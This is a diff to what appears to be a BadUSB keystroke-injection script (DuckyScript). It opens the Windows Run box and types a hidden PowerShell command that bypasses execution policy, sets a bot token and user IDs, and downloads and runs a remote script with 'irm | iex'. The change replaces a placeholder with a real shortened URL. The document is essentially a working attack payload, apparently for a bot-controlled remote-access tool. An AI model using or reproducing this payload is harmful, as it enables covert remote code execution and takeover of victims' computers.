@@ -9,5 +9,6 @@
 ESC
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $APPTK="YOUR_BOT_TOKEN_HERE"; $PU=@(USER_IDS); irm LINK | iex
+STRING powershell -NoP -Ep Bypass -W H -C $APPTK="YOUR_BOT_TOKEN_HERE"; $PU=@(USER_IDS); irm https://is.gd/aAkvgP | iex
+
 ENTER
